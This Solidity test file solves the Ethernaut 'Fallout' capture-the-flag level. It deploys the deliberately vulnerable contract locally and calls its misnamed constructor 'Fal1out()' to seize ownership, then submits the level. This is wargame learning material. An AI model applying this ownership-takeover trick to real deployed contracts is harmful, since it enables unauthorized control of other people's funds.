pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../src/02-Fallout/FalloutFactory.sol";
import "../src/Ethernaut.sol";
import "./utils/vm.sol";

contract FalloutTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address playerAddress = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266; // this address doesn't mean anything, this is just a placeholder for my own wallet address i.e. a metamask address

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testFalloutHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // ok so this level only has one step. The constructor doesn't have the same
        // name as the contract. Thus we can call the constructor as a "normal" function
        // and the "owner = msg.sender;" will be us.
        ethernautFallout.Fal1out();
        assertEq(ethernautFallout.owner(), 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
